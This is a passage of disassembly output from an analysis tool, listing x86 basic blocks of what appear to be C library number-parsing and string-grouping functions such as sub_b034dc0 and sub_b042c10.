0xb034917:	cmp	al, 0x30
0xb034919:	mov	byte ptr [esp + 0x14], al
0xb03491d:	je	0xb034b48
None
|
|
|
v
0xb034af7:	mov	eax, dword ptr [esp + 0x60]
0xb034afb:	mov	eax, dword ptr [eax + 0x3c]
0xb034afe:	mov	eax, dword ptr [eax + ecx*4]
0xb034b01:	sub	eax, 0x37
0xb034b04:	jmp	0xb0349ee
None
|
|
|
v
0xb034bd0:	mov	eax, dword ptr [esp + 0x54]
0xb034bd4:	mov	edi, dword ptr [esp + 0x50]
0xb034bd8:	mov	dword ptr [eax], edi
0xb034bda:	xor	eax, eax
0xb034bdc:	jmp	0xb034a8e
None
|
|
|
v
0xb034895:	xor	ecx, ecx
0xb034897:	xor	edi, edi
0xb034899:	cmp	dword ptr [esp + 0x58], 1
0xb03489e:	je	0xb034a78
None
|
|
|
v
0xb03492f:	cmp	dword ptr [esp + 0x58], 0xa
0xb034934:	je	0xb034a96
None
|
|
|
v
0xb0349db:	cmp	dword ptr [esp + 0x18], eax
0xb0349df:	je	0xb034b3f
None
|
|
|
v
0xb034c7d:	xor	eax, eax
0xb034c7f:	jmp	0xb034c95
None
|
|
|
v
0xb034a8e:	add	esp, 0x3c
0xb034a91:	pop	ebx
0xb034a92:	pop	esi
0xb034a93:	pop	edi
0xb034a94:	pop	ebp
0xb034a95:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b034dc0
TOTAL BLOCKS :91
0xb035185:	add	eax, 1
0xb035188:	cmp	eax, dword ptr [esp + 0x1c]
0xb03518c:	jne	0xb035178
None
|
|
|
v
0xb035060:	mov	eax, dword ptr [esp + 0x20]
0xb035064:	movsx	edx, byte ptr [eax + 1]
0xb035068:	mov	eax, dword ptr [esp + 0x60]
0xb03506c:	mov	eax, dword ptr [eax + 0x3c]
0xb03506f:	cmp	dword ptr [eax + edx*4], 0x58
0xb035073:	je	0xb0350eb
None
|
|
|
v
0xb0350aa:	mov	eax, dword ptr [esp + 0x50]
0xb0350ae:	mov	dword ptr [esp + 0x20], eax
0xb0350b2:	mov	eax, dword ptr [esp + 0x54]
0xb0350b6:	test	eax, eax
0xb0350b8:	je	0xb035124
None
|
|
|
v
0xb034e38:	mov	dword ptr [esp + 0x20], edx
0xb034e3c:	test	al, al
0xb034e3e:	je	0xb0350aa
None
|
|
|
v
0xb034f78:	cmp	ecx, dword ptr [esp + 0x20]
0xb034f7c:	je	0xb0350b2
None
|
|
|
v
0xb035037:	mov	edx, dword ptr [esp + 0x60]
0xb03503b:	mov	edx, dword ptr [edx + 0x3c]
0xb03503e:	mov	edx, dword ptr [edx + eax*4]
0xb035041:	sub	edx, 0x37
0xb035044:	jmp	0xb034f47
None
|
|
|
v
0xb0351cb:	lea	eax, dword ptr [edx - 0x30]
0xb0351ce:	cmp	al, 9
0xb0351d0:	jbe	0xb035206
None
|
|
|
v
0xb035098:	add	dword ptr [esp + 0x20], 1
0xb03509d:	mov	dword ptr [esp + 0x2c], 1
0xb0350a5:	jmp	0xb034e60
None
|
|
|
v
0xb035052:	test	dword ptr [esp + 0x58], 0xffffffef
0xb03505a:	jne	0xb034e7f
None
|
|
|
v
0xb034e3c:	test	al, al
0xb034e3e:	je	0xb0350aa
None
|
|
|
v
0xb0350b2:	mov	eax, dword ptr [esp + 0x54]
0xb0350b6:	test	eax, eax
0xb0350b8:	je	0xb035124
None
|
|
|
v
0xb035155:	test	eax, eax
0xb035157:	mov	esi, eax
0xb035159:	mov	dword ptr [esp + 0x1c], eax
0xb03515d:	je	0xb0350b2
None
|
|
|
v
0xb035002:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb034ef0:	test	esi, esi
0xb034ef2:	je	0xb035025
None
|
|
|
v
0xb03524c:	movzx	edx, byte ptr [esp + 0x27]
0xb035251:	mov	dword ptr [esp + 0x18], ebp
0xb035255:	mov	eax, dword ptr [esp + 0x18]
0xb035259:	test	byte ptr [eax + edx*2 + 1], 4
0xb03525e:	je	0xb035216
None
|
|
|
v
0xb034e73:	mov	eax, dword ptr [esp + 0x58]
0xb034e77:	test	eax, eax
0xb034e79:	je	0xb034fd6
None
|
|
|
v
0xb034e28:	add	edx, 1
0xb034e2b:	movzx	eax, byte ptr [edx]
0xb034e2e:	movsx	esi, al
0xb034e31:	test	byte ptr [ebp + esi*2 + 1], 0x20
0xb034e36:	jne	0xb034e28
None
|
|
|
v
0xb034f90:	mov	edx, dword ptr [esp + 0x1c]
0xb034f94:	test	edx, edx
0xb034f96:	jne	0xb03512b
None
|
|
|
v
0xb035081:	mov	edx, 0x30
0xb035086:	mov	eax, 6
0xb03508b:	mov	dword ptr [esp + 0x58], 8
0xb035093:	jmp	0xb034e96
None
|
|
|
v
0xb035206:	add	dword ptr [esp + 0x14], 1
0xb03520b:	mov	eax, dword ptr [esp + 0x14]
0xb03520f:	movzx	edx, byte ptr [eax]
0xb035212:	test	dl, dl
0xb035214:	jne	0xb0351cb
None
|
|
|
v
0xb0351ec:	mov	edx, dword ptr [esp + 0x14]
0xb0351f0:	movzx	edx, byte ptr [edx + eax]
0xb0351f4:	cmp	byte ptr [edi + eax], dl
0xb0351f7:	jne	0xb03524c
None
|
|
|
v
0xb034f24:	add	ecx, dword ptr [esp + 0x28]
0xb034f28:	movzx	eax, byte ptr [ecx + 1]
0xb034f2c:	lea	edx, dword ptr [ecx + 1]
0xb034f2f:	test	al, al
0xb034f31:	je	0xb034f76
None
|
|
|
v
0xb035174:	xor	eax, eax
0xb035176:	jmp	0xb035185
None
|
|
|
v
0xb03526d:	jmp	0xb035216
None
|
|
|
v
0xb034e7f:	cmp	dword ptr [esp + 0x58], 0xa
0xb034e84:	je	0xb034fd6
None
|
|
|
v
0xb034e4c:	cmp	al, 0x2b
0xb034e4e:	sete	al
0xb034e51:	movzx	eax, al
0xb034e54:	add	dword ptr [esp + 0x20], eax
0xb034e58:	mov	dword ptr [esp + 0x2c], 0
0xb034e60:	mov	eax, dword ptr [esp + 0x20]
0xb034e64:	movzx	eax, byte ptr [eax]
0xb034e67:	cmp	al, 0x30
0xb034e69:	mov	byte ptr [esp + 0x14], al
0xb034e6d:	je	0xb035052
None
|
|
|
v
0xb0351d2:	mov	ebp, dword ptr [esp + 0x14]
0xb0351d6:	movzx	eax, byte ptr [esp + 0x26]
0xb0351db:	cmp	byte ptr [ebp], al
0xb0351de:	jne	0xb035255
None
|
|
|
v
0xb035049:	mov	ecx, dword ptr [esp + 0x18]
0xb03504d:	jmp	0xb034f82
None
|
|
|
v
0xb034f8a:	mov	eax, dword ptr [esp + 0x54]
0xb034f8e:	mov	dword ptr [eax], ecx
0xb034f90:	mov	edx, dword ptr [esp + 0x1c]
0xb034f94:	test	edx, edx
0xb034f96:	jne	0xb03512b
None
|
|
|
v
0xb034fd6:	test	ecx, ecx
0xb034fd8:	jne	0xb035149
None
|
|
|
v
0xb034f5a:	cmp	ebp, dword ptr [esp + 0x14]
0xb034f5e:	je	0xb034ff8
None
|
|
|
v
0xb034dff:	mov	eax, dword ptr [esp + 0x60]
0xb034e03:	mov	esi, dword ptr [esp + 0x50]
0xb034e07:	mov	ebp, dword ptr [eax + 0x34]
0xb034e0a:	mov	eax, dword ptr [esp + 0x50]
0xb034e0e:	mov	dword ptr [esp + 0x20], esi
0xb034e12:	movzx	eax, byte ptr [eax]
0xb034e15:	movsx	edx, al
0xb034e18:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb034e1d:	je	0xb034e3c
None
|
|
|
v
0xb035149:	mov	dword ptr [esp], edi
0xb03514c:	mov	dword ptr [esp + 0x18], ecx
0xb035150:	call	0xb07ae80
None
|
|
|
v
0xb034dc0:	push	ebp
0xb034dc1:	push	edi
0xb034dc2:	push	esi
0xb034dc3:	push	ebx
0xb034dc4:	sub	esp, 0x3c
0xb034dc7:	mov	edx, dword ptr [esp + 0x5c]
0xb034dcb:	mov	eax, dword ptr [esp + 0x60]
0xb034dcf:	call	0xb1267db
None
|
|
|
v
0xb034f76:	mov	ecx, edx
0xb034f78:	cmp	ecx, dword ptr [esp + 0x20]
0xb034f7c:	je	0xb0350b2
None
|
|
|
v
0xb034e60:	mov	eax, dword ptr [esp + 0x20]
0xb034e64:	movzx	eax, byte ptr [eax]
0xb034e67:	cmp	al, 0x30
0xb034e69:	mov	byte ptr [esp + 0x14], al
0xb034e6d:	je	0xb035052
None
|
|
|
v
0xb0351f9:	add	eax, 1
0xb0351fc:	cmp	eax, dword ptr [esp + 0x1c]
0xb035200:	jne	0xb0351ec
None
|
|
|
v
0xb0351b1:	jmp	0xb034de9
None
|
|
|
v
0xb0351b6:	movzx	edx, byte ptr [esp + 0x14]
0xb0351bb:	mov	eax, dword ptr [esp + 0x20]
0xb0351bf:	test	dl, dl
0xb0351c1:	mov	dword ptr [esp + 0x14], eax
0xb0351c5:	je	0xb035216
None
|
|
|
v
0xb034fde:	movzx	edx, byte ptr [esp + 0x14]
0xb034fe3:	mov	eax, 8
0xb034fe8:	mov	dword ptr [esp + 0x58], 0xa
0xb034ff0:	jmp	0xb034e96
None
|
|
|
v
0xb034f03:	xor	edx, edx
0xb034f05:	mov	byte ptr [esp + 0x26], al
0xb034f09:	jmp	0xb034f1d
None
|
|
|
v
0xb0350eb:	mov	eax, dword ptr [esp + 0x20]
0xb0350ef:	mov	dword ptr [esp + 0x58], 0x10
0xb0350f7:	movzx	edx, byte ptr [eax + 2]
0xb0350fb:	add	eax, 2
0xb0350fe:	mov	dword ptr [esp + 0x20], eax
0xb035102:	mov	eax, 0xe
0xb035107:	jmp	0xb034e96
None
|
|
|
v
0xb035163:	movzx	eax, byte ptr [edi]
0xb035166:	cmp	byte ptr [esp + 0x14], al
0xb03516a:	mov	ecx, dword ptr [esp + 0x18]
0xb03516e:	mov	byte ptr [esp + 0x26], al
0xb035172:	jne	0xb0351b6
None
|
|
|
v
0xb035008:	mov	dword ptr [esp + 0x1c], 1
0xb035010:	jmp	0xb034f28
None
|
|
|
v
0xb034f3d:	mov	ecx, edx
0xb034f3f:	lea	edx, dword ptr [eax - 0x30]
0xb034f42:	cmp	dl, 9
0xb034f45:	ja	0xb034ef0
None
|
|
|
v
0xb034de9:	cmp	dword ptr [esp + 0x58], 1
0xb034dee:	je	0xb034fb8
None
|
|
|
v
0xb035255:	mov	eax, dword ptr [esp + 0x18]
0xb035259:	test	byte ptr [eax + edx*2 + 1], 4
0xb03525e:	je	0xb035216
None
|
|
|
v
0xb034ec2:	mov	ecx, dword ptr [esp + 0x20]
0xb034ec6:	cmp	dword ptr [esp + 0x18], ecx
0xb034eca:	je	0xb0350b2
None
|
|
|
v
0xb034f47:	movzx	eax, dl
0xb034f4a:	cmp	eax, dword ptr [esp + 0x58]
0xb034f4e:	jge	0xb034f78
None
|
|
|
v
0xb035193:	mov	ecx, dword ptr [eax + 0x2c]
0xb035196:	movzx	edi, byte ptr [ecx]
0xb035199:	lea	edx, dword ptr [edi - 1]
0xb03519c:	cmp	dl, 0x7d
0xb03519f:	ja	0xb034de5
None
|
|
|
v
0xb03518e:	jmp	0xb0350b2
None
|
|
|
v
0xb0351e0:	xor	eax, eax
0xb0351e2:	mov	ebp, dword ptr [esp + 0x18]
0xb0351e6:	mov	byte ptr [esp + 0x27], dl
0xb0351ea:	jmp	0xb0351f9
None
|
|
|
v
0xb034f82:	mov	esi, dword ptr [esp + 0x54]
0xb034f86:	test	esi, esi
0xb034f88:	je	0xb034f90
None
|
|
|
v
0xb034ef8:	movzx	edx, byte ptr [ecx]
0xb034efb:	cmp	byte ptr [edi], dl
0xb034efd:	jne	0xb035025
None
|
|
|
v
0xb034ea0:	mov	ecx, dword ptr [ebx + eax*4 - 0x54520]
0xb034ea7:	movzx	eax, byte ptr [ebx + eax - 0x54560]
0xb034eaf:	mov	dword ptr [esp + 0x14], ecx
0xb034eb3:	mov	byte ptr [esp + 0x27], al
0xb034eb7:	movzx	eax, dl
0xb034eba:	test	al, al
0xb034ebc:	je	0xb0350b2
None
|
|
|
v
0xb034e44:	cmp	al, 0x2d
0xb034e46:	je	0xb035098
None
|
|
|
v
0xb0351a5:	mov	edi, dword ptr [eax + 0x28]
0xb0351a8:	cmp	byte ptr [edi], 0
0xb0351ab:	je	0xb034de5
None
|
|
|
v
0xb035260:	mov	eax, dword ptr [esp + 0x60]
0xb035264:	mov	eax, dword ptr [eax + 0x3c]
0xb035267:	cmp	dword ptr [eax + edx*4], 0x40
0xb03526b:	jle	0xb035206
None
|
|
|
v
0xb035202:	mov	dword ptr [esp + 0x18], ebp
0xb035206:	add	dword ptr [esp + 0x14], 1
0xb03520b:	mov	eax, dword ptr [esp + 0x14]
0xb03520f:	movzx	edx, byte ptr [eax]
0xb035212:	test	dl, dl
0xb035214:	jne	0xb0351cb
None
|
|
|
v
0xb034df4:	cmp	dword ptr [esp + 0x58], 0x24
0xb034df9:	ja	0xb034fb8
None
|
|
|
v
0xb035216:	mov	ebp, dword ptr [esp + 0x20]
0xb03521a:	mov	eax, dword ptr [esp + 0x14]
0xb03521e:	mov	dword ptr [esp + 0xc], ecx
0xb035222:	mov	dword ptr [esp + 8], edi
0xb035226:	mov	dword ptr [esp], ebp
0xb035229:	mov	dword ptr [esp + 4], eax
0xb03522d:	call	0xb042c10
None
|
|
|
v
0xb03510c:	cmp	byte ptr [edi - 2], 0x30
0xb035110:	mov	eax, edi
0xb035112:	jne	0xb0350da
None
|
|
|
v
0xb03512b:	mov	eax, dword ptr [ebx - 0xdc]
0xb035131:	mov	edx, dword ptr gs:[0]
0xb035138:	mov	dword ptr [edx + eax], 0x22
0xb03513f:	mov	eax, 0xffffffff
0xb035144:	jmp	0xb034fce
None
|
|
|
v
0xb034fce:	add	esp, 0x3c
0xb034fd1:	pop	ebx
0xb034fd2:	pop	esi
0xb034fd3:	pop	edi
0xb034fd4:	pop	ebp
0xb034fd5:	ret	
None
|
|
|
v
0xb034e8a:	mov	eax, dword ptr [esp + 0x58]
0xb034e8e:	movzx	edx, byte ptr [esp + 0x14]
0xb034e93:	sub	eax, 2
0xb034e96:	xor	esi, esi
0xb034e98:	mov	dword ptr [esp + 0x18], 0
0xb034ea0:	mov	ecx, dword ptr [ebx + eax*4 - 0x54520]
0xb034ea7:	movzx	eax, byte ptr [ebx + eax - 0x54560]
0xb034eaf:	mov	dword ptr [esp + 0x14], ecx
0xb034eb3:	mov	byte ptr [esp + 0x27], al
0xb034eb7:	movzx	eax, dl
0xb034eba:	test	al, al
0xb034ebc:	je	0xb0350b2
None
|
|
|
v
0xb0350c9:	mov	eax, dword ptr [esp + 0x60]
0xb0350cd:	movsx	edx, byte ptr [edi - 1]
0xb0350d1:	mov	eax, dword ptr [eax + 0x3c]
0xb0350d4:	cmp	dword ptr [eax + edx*4], 0x58
0xb0350d8:	je	0xb03510c
None
|
|
|
v
0xb034f10:	movzx	eax, byte ptr [ecx + edx]
0xb034f14:	cmp	byte ptr [edi + edx], al
0xb034f17:	jne	0xb035018
None
|
|
|
v
0xb035114:	mov	edi, dword ptr [esp + 0x54]
0xb035118:	sub	eax, 1
0xb03511b:	mov	dword ptr [edi], eax
0xb03511d:	xor	eax, eax
0xb03511f:	jmp	0xb034fce
None
|
|
|
v
0xb0350ba:	mov	edi, dword ptr [esp + 0x20]
0xb0350be:	mov	eax, edi
0xb0350c0:	sub	eax, dword ptr [esp + 0x50]
0xb0350c4:	cmp	eax, 1
0xb0350c7:	jle	0xb0350da
None
|
|
|
v
0xb034e96:	xor	esi, esi
0xb034e98:	mov	dword ptr [esp + 0x18], 0
0xb034ea0:	mov	ecx, dword ptr [ebx + eax*4 - 0x54520]
0xb034ea7:	movzx	eax, byte ptr [ebx + eax - 0x54560]
0xb034eaf:	mov	dword ptr [esp + 0x14], ecx
0xb034eb3:	mov	byte ptr [esp + 0x27], al
0xb034eb7:	movzx	eax, dl
0xb034eba:	test	al, al
0xb034ebc:	je	0xb0350b2
None
|
|
|
v
0xb035018:	cmp	esi, edx
0xb03501a:	movzx	eax, byte ptr [esp + 0x26]
0xb03501f:	je	0xb034f24
None
|
|
|
v
0xb035075:	mov	eax, dword ptr [esp + 0x58]
0xb035079:	test	eax, eax
0xb03507b:	jne	0xb034e7f
None
|
|
|
v
0xb034ff8:	cmp	dl, byte ptr [esp + 0x27]
0xb034ffc:	jbe	0xb034f64
None
|
|
|
v
0xb034ee9:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb034fb8:	mov	eax, dword ptr [ebx - 0xdc]
0xb034fbe:	mov	edx, dword ptr gs:[0]
0xb034fc5:	mov	dword ptr [edx + eax], 0x16
0xb034fcc:	xor	eax, eax
0xb034fce:	add	esp, 0x3c
0xb034fd1:	pop	ebx
0xb034fd2:	pop	esi
0xb034fd3:	pop	edi
0xb034fd4:	pop	ebp
0xb034fd5:	ret	
None
|
|
|
v
0xb035124:	xor	eax, eax
0xb035126:	jmp	0xb034fce
None
|
|
|
v
0xb034f9c:	mov	edi, dword ptr [esp + 0x2c]
0xb034fa0:	mov	edx, ebp
0xb034fa2:	mov	eax, ebp
0xb034fa4:	neg	edx
0xb034fa6:	test	edi, edi
0xb034fa8:	cmovne	eax, edx
0xb034fab:	add	esp, 0x3c
0xb034fae:	pop	ebx
0xb034faf:	pop	esi
0xb034fb0:	pop	edi
0xb034fb1:	pop	ebp
0xb034fb2:	ret	
None
|
|
|
v
0xb035232:	movzx	edx, byte ptr [ebp]
0xb035236:	mov	dword ptr [esp + 0x58], 0xa
0xb03523e:	mov	dword ptr [esp + 0x18], eax
0xb035242:	mov	eax, 8
0xb035247:	jmp	0xb034ea0
None
|
|
|
v
0xb034de5:	xor	ecx, ecx
0xb034de7:	xor	edi, edi
0xb034de9:	cmp	dword ptr [esp + 0x58], 1
0xb034dee:	je	0xb034fb8
None
|
|
|
v
0xb034e1f:	mov	edx, dword ptr [esp + 0x20]
0xb034e23:	nop	
0xb034e24:	lea	esi, dword ptr [esi]
0xb034e28:	add	edx, 1
0xb034e2b:	movzx	eax, byte ptr [edx]
0xb034e2e:	movsx	esi, al
0xb034e31:	test	byte ptr [ebp + esi*2 + 1], 0x20
0xb034e36:	jne	0xb034e28
None
|
|
|
v
0xb034f1d:	add	edx, 1
0xb034f20:	cmp	edx, esi
0xb034f22:	jne	0xb034f10
None
|
|
|
v
0xb035025:	mov	edx, dword ptr [esp + 0x60]
0xb035029:	mov	edx, dword ptr [edx + 0x34]
0xb03502c:	test	byte ptr [edx + eax*2 + 1], 4
0xb035031:	je	0xb034f78
None
|
|
|
v
0xb0351c7:	mov	dword ptr [esp + 0x18], ebp
0xb0351cb:	lea	eax, dword ptr [edx - 0x30]
0xb0351ce:	cmp	al, 9
0xb0351d0:	jbe	0xb035206
None
|
|
|
v
0xb034f33:	cmp	dword ptr [esp + 0x18], edx
0xb034f37:	je	0xb035049
None
|
|
|
v
0xb034dd4:	add	ebx, 0x17622c
0xb034dda:	test	edx, edx
0xb034ddc:	mov	eax, dword ptr [eax + 4]
0xb034ddf:	jne	0xb035193
None
|
|
|
v
0xb034f50:	cmp	dword ptr [esp + 0x14], ebp
0xb034f54:	jb	0xb035008
None
|
|
|
v
0xb034f64:	imul	ebp, dword ptr [esp + 0x58]
0xb034f69:	lea	edx, dword ptr [ecx + 1]
0xb034f6c:	add	ebp, eax
0xb034f6e:	movzx	eax, byte ptr [ecx + 1]
0xb034f72:	test	al, al
0xb034f74:	jne	0xb034f33
None
|
|
|
v
0xb034f28:	movzx	eax, byte ptr [ecx + 1]
0xb034f2c:	lea	edx, dword ptr [ecx + 1]
0xb034f2f:	test	al, al
0xb034f31:	je	0xb034f76
None
|
|
|
v
0xb035178:	mov	edx, dword ptr [esp + 0x20]
0xb03517c:	movzx	edx, byte ptr [edx + eax]
0xb035180:	cmp	byte ptr [edi + eax], dl
0xb035183:	jne	0xb0351b6
None
|
|
|
v
0xb0350da:	mov	eax, dword ptr [esp + 0x54]
0xb0350de:	mov	edi, dword ptr [esp + 0x50]
0xb0350e2:	mov	dword ptr [eax], edi
0xb0350e4:	xor	eax, eax
0xb0350e6:	jmp	0xb034fce
None
|
|
|
v
0xb034ed0:	lea	edx, dword ptr [esi - 1]
0xb034ed3:	xor	ebp, ebp
0xb034ed5:	mov	dword ptr [esp + 0x28], edx
0xb034ed9:	lea	edx, dword ptr [eax - 0x30]
0xb034edc:	cmp	dl, 9
0xb034edf:	mov	dword ptr [esp + 0x1c], 0
0xb034ee7:	jbe	0xb034f47
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b042c10
TOTAL BLOCKS :50
0xb042df6:	mov	ebp, eax
0xb042df8:	mov	edi, ebp
0xb042dfa:	lea	esi, dword ptr [esi]
0xb042e00:	mov	eax, dword ptr [esp + 0x18]
0xb042e04:	movzx	edx, byte ptr [eax + 1]
0xb042e08:	test	dl, dl
0xb042e0a:	jne	0xb042d53
None
|
|
|
v
0xb042ee5:	sub	ebp, eax
0xb042ee7:	mov	eax, ebp
0xb042ee9:	jmp	0xb042eb4
None
|
|
|
v
0xb042da0:	mov	eax, dword ptr [esp + 0x38]
0xb042da4:	mov	dword ptr [esp + 4], edi
0xb042da8:	add	eax, 1
0xb042dab:	jmp	0xb042dca
None
|
|
|
v
0xb042c5d:	mov	eax, dword ptr [esp + 0x38]
0xb042c61:	mov	ebp, dword ptr [esp + 0x10]
0xb042c65:	add	ebp, dword ptr [esp + 0x34]
0xb042c69:	movzx	eax, byte ptr [eax]
0xb042c6c:	mov	byte ptr [esp + 0x16], al
0xb042c70:	jmp	0xb042c88
None
|
|
|
v
0xb042d7f:	add	edi, dword ptr [esp + 0x10]
0xb042d83:	cmp	byte ptr [esp + 0x16], 0
0xb042d88:	je	0xb042ed1
None
|
|
|
v
0xb042cd7:	mov	eax, dword ptr [esp + 0x3c]
0xb042cdb:	mov	edx, dword ptr [esp + 0x34]
0xb042cdf:	movsx	eax, byte ptr [eax]
0xb042ce2:	sub	edx, edi
0xb042ce4:	add	eax, 1
0xb042ce7:	cmp	edx, eax
0xb042ce9:	je	0xb042d3b
None
|
|
|
v
0xb042e00:	mov	eax, dword ptr [esp + 0x18]
0xb042e04:	movzx	edx, byte ptr [eax + 1]
0xb042e08:	test	dl, dl
0xb042e0a:	jne	0xb042d53
None
|
|
|
v
0xb042e7a:	movzx	edx, byte ptr [eax]
0xb042e7d:	test	dl, dl
0xb042e7f:	jne	0xb042e60
None
|
|
|
v
0xb042e98:	sub	dword ptr [esp + 8], 1
0xb042e9d:	sub	edi, 1
0xb042ea0:	mov	eax, dword ptr [esp + 8]
0xb042ea4:	cmp	dword ptr [esp + 0xc], eax
0xb042ea8:	jne	0xb042d92
None
|
|
|
v
0xb042eae:	mov	eax, ebp
0xb042eb0:	sub	eax, dword ptr [esp + 0xc]
0xb042eb4:	movsx	edx, byte ptr [esp + 0x17]
0xb042eb9:	cmp	edx, eax
0xb042ebb:	jge	0xb042d30
None
|
|
|
v
0xb042ccd:	cmp	edi, dword ptr [esp + 0x30]
0xb042cd1:	mov	dword ptr [esp + 0x1c], edi
0xb042cd5:	jb	0xb042d30
None
|
|
|
v
0xb042dca:	movzx	edx, byte ptr [eax]
0xb042dcd:	test	dl, dl
0xb042dcf:	jne	0xb042db0
None
|
|
|
v
0xb042dd1:	mov	edi, dword ptr [esp + 8]
0xb042dd5:	cmp	edi, dword ptr [esp + 0x30]
0xb042dd9:	mov	eax, dword ptr [esp + 8]
0xb042ddd:	jb	0xb042ee5
None
|
|
|
v
0xb042c92:	mov	eax, dword ptr [esp + 0x38]
0xb042c96:	movzx	eax, byte ptr [eax + 1]
0xb042c9a:	test	al, al
0xb042c9c:	je	0xb042ccd
None
|
|
|
v
0xb042ef0:	xor	eax, eax
0xb042ef2:	jmp	0xb042eb4
None
|
|
|
v
0xb042d8e:	mov	dword ptr [esp + 8], ebp
0xb042d92:	movzx	eax, byte ptr [esp + 0x16]
0xb042d97:	cmp	byte ptr [edi - 1], al
0xb042d9a:	jne	0xb042e98
None
|
|
|
v
0xb042c88:	movzx	eax, byte ptr [esp + 0x16]
0xb042c8d:	cmp	byte ptr [ebp - 1], al
0xb042c90:	jne	0xb042c78
None
|
|
|
v
0xb042ceb:	lea	ecx, dword ptr [edi + eax]
0xb042cee:	cmp	edx, eax
0xb042cf0:	cmovle	ecx, edi
0xb042cf3:	mov	dword ptr [esp + 0x34], ecx
0xb042cf7:	mov	eax, dword ptr [esp + 0x34]
0xb042cfb:	cmp	dword ptr [esp + 0x30], eax
0xb042cff:	jb	0xb042c4c
None
|
|
|
v
0xb042d20:	sub	ebp, 1
0xb042d23:	sub	edi, 1
0xb042d26:	cmp	dword ptr [esp + 0xc], ebp
0xb042d2a:	jne	0xb042e3e
None
|
|
|
v
0xb042c22:	mov	eax, dword ptr [esp + 0x38]
0xb042c26:	mov	dword ptr [esp], eax
0xb042c29:	call	0xb07ae80
None
|
|
|
v
0xb042c9e:	cmp	al, byte ptr [ebp - 2]
0xb042ca1:	jne	0xb042c78
None
|
|
|
v
0xb042e81:	cmp	dword ptr [esp + 0x30], ebp
0xb042e85:	ja	0xb042d30
None
|
|
|
v
0xb042e10:	mov	eax, dword ptr [esp + 0x18]
0xb042e14:	lea	ebp, dword ptr [edi - 1]
0xb042e17:	movzx	eax, byte ptr [eax]
0xb042e1a:	mov	byte ptr [esp + 0x17], al
0xb042e1e:	cmp	byte ptr [esp + 0x17], 0
0xb042e23:	jns	0xb042d6a
None
|
|
|
v
0xb042d53:	add	dword ptr [esp + 0x18], 1
0xb042d58:	lea	ebp, dword ptr [edi - 1]
0xb042d5b:	mov	byte ptr [esp + 0x17], dl
0xb042d5f:	cmp	byte ptr [esp + 0x17], 0
0xb042d64:	js	0xb042e29
None
|
|
|
v
0xb042c10:	push	ebp
0xb042c11:	push	edi
0xb042c12:	push	esi
0xb042c13:	sub	esp, 0x20
0xb042c16:	mov	eax, dword ptr [esp + 0x3c]
0xb042c1a:	test	eax, eax
0xb042c1c:	je	0xb042d30
None
|
|
|
v
0xb042de3:	movsx	edx, byte ptr [esp + 0x17]
0xb042de8:	mov	ecx, ebp
0xb042dea:	sub	ecx, dword ptr [esp + 8]
0xb042dee:	cmp	ecx, edx
0xb042df0:	jne	0xb042ec1
None
|
|
|
v
0xb042e60:	mov	ecx, dword ptr [esp + 4]
0xb042e64:	add	eax, 1
0xb042e67:	sub	dword ptr [esp + 4], 1
0xb042e6c:	movzx	esi, byte ptr [ecx - 2]
0xb042e70:	mov	ecx, esi
0xb042e72:	cmp	dl, cl
0xb042e74:	jne	0xb042d20
None
|
|
|
v
0xb042c78:	sub	edi, 1
0xb042c7b:	sub	ebp, 1
0xb042c7e:	cmp	edi, dword ptr [esp + 0xc]
0xb042c82:	je	0xb042d30
None
|
|
|
v
0xb042ed1:	mov	dword ptr [esp + 8], ebp
0xb042ed5:	mov	edi, dword ptr [esp + 8]
0xb042ed9:	mov	eax, ebp
0xb042edb:	cmp	edi, dword ptr [esp + 0x30]
0xb042edf:	jae	0xb042de3
None
|
|
|
v
0xb042cb0:	mov	esi, dword ptr [esp + 4]
0xb042cb4:	add	eax, 1
0xb042cb7:	sub	dword ptr [esp + 4], 1
0xb042cbc:	movzx	esi, byte ptr [esi - 3]
0xb042cc0:	mov	edx, esi
0xb042cc2:	cmp	cl, dl
0xb042cc4:	jne	0xb042c78
None
|
|
|
v
0xb042c3c:	sub	eax, 1
0xb042c3f:	mov	dword ptr [esp + 0x10], eax
0xb042c43:	mov	eax, edi
0xb042c45:	sub	eax, 1
0xb042c48:	mov	dword ptr [esp + 0xc], eax
0xb042c4c:	mov	eax, dword ptr [esp + 0x34]
0xb042c50:	lea	edi, dword ptr [eax - 1]
0xb042c53:	cmp	dword ptr [esp + 0x30], edi
0xb042c57:	ja	0xb042d30
None
|
|
|
v
0xb042d92:	movzx	eax, byte ptr [esp + 0x16]
0xb042d97:	cmp	byte ptr [edi - 1], al
0xb042d9a:	jne	0xb042e98
None
|
|
|
v
0xb042c2e:	mov	edi, dword ptr [esp + 0x30]
0xb042c32:	cmp	dword ptr [esp + 0x34], edi
0xb042c36:	jbe	0xb042d05
None
|
|
|
v
0xb042d6a:	cmp	byte ptr [esp + 0x17], 0x7f
0xb042d6f:	je	0xb042e29
None
|
|
|
v
0xb042eb4:	movsx	edx, byte ptr [esp + 0x17]
0xb042eb9:	cmp	edx, eax
0xb042ebb:	jge	0xb042d30
None
|
|
|
v
0xb042e8b:	mov	edi, ebp
0xb042e8d:	jmp	0xb042e00
None
|
|
|
v
0xb042d30:	mov	eax, dword ptr [esp + 0x34]
0xb042d34:	add	esp, 0x20
0xb042d37:	pop	esi
0xb042d38:	pop	edi
0xb042d39:	pop	ebp
0xb042d3a:	ret	
None
|
|
|
v
0xb042cc6:	movzx	ecx, byte ptr [eax]
0xb042cc9:	test	cl, cl
0xb042ccb:	jne	0xb042cb0
None
|
|
|
v
0xb042ca3:	mov	eax, dword ptr [esp + 0x38]
0xb042ca7:	mov	dword ptr [esp + 4], ebp
0xb042cab:	add	eax, 2
0xb042cae:	jmp	0xb042cc6
None
|
|
|
v
0xb042d3b:	mov	eax, dword ptr [esp + 0x3c]
0xb042d3f:	mov	dword ptr [esp + 0x18], eax
0xb042d43:	mov	eax, dword ptr [esp + 0x18]
0xb042d47:	movzx	edx, byte ptr [eax + 1]
0xb042d4b:	test	dl, dl
0xb042d4d:	je	0xb042e10
None
|
|
|
v
0xb042ec1:	mov	eax, dword ptr [esp + 0x1c]
0xb042ec5:	sub	eax, 1
0xb042ec8:	mov	dword ptr [esp + 0x34], eax
0xb042ecc:	jmp	0xb042cf7
None
|
|
|
v
0xb042e3e:	movzx	eax, byte ptr [esp + 0x16]
